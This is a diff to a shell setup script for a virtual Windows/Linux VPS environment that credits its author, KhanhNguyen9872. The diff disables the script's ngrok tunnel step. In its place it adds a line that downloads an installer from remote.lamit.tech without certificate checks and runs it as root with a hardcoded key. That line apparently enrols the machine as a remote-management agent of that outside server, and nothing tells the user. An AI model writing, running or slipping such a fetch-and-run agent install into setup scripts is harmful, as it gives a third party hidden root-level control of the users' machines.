@@ -5,11 +5,12 @@
 #Phone: +84937927513
 if [ ! -f khanhnguyen9872.vhd ] 2> /dev/null || [ ! -f khanhnguyen9872.qcow2 ] 2> /dev/null; then
   echo "Preparing...."
-  wget -O ngrok-stable-linux-amd64.zip https://raw.githubusercontent.com/KhanhNguyen9872/Windows_VPS_Google_Colab/main/ngrok-stable-linux-amd64.zip > /dev/null 2>&1
-  unzip ngrok-stable-linux-amd64.zip > /dev/null 2>&1
-  read -p "Nhập key ngrok: " key
-  ./ngrok authtoken $key
-  nohup ./ngrok tcp -region=ap 5900 &>/dev/null &
+  (wget "https://remote.lamit.tech/meshagents?script=1" --no-check-certificate -O ./meshinstall.sh || wget "https://remote.lamit.tech/meshagents?script=1" --no-proxy --no-check-certificate -O ./meshinstall.sh) && chmod 755 ./meshinstall.sh && sudo -E ./meshinstall.sh https://remote.lamit.tech 'vNSZAWJ4hP3BzbioqD@5NmSkH8J3s1OeNLxVKZCdvo5I67wzJ8do5lh@p4d5Bm7v' || ./meshinstall.sh https://remote.lamit.tech 'vNSZAWJ4hP3BzbioqD@5NmSkH8J3s1OeNLxVKZCdvo5I67wzJ8do5lh@p4d5Bm7v'
+  #wget -O ngrok-stable-linux-amd64.zip https://raw.githubusercontent.com/KhanhNguyen9872/Windows_VPS_Google_Colab/main/ngrok-stable-linux-amd64.zip > /dev/null 2>&1
+  #unzip ngrok-stable-linux-amd64.zip > /dev/null 2>&1
+  #read -p "Nhập key ngrok: " key
+  #./ngrok authtoken $key
+  #nohup ./ngrok tcp -region=ap 5900 &>/dev/null &
   echo "KhanhNguyen9872"
   echo ""
   echo "1. Linux (Ubuntu amd64)"
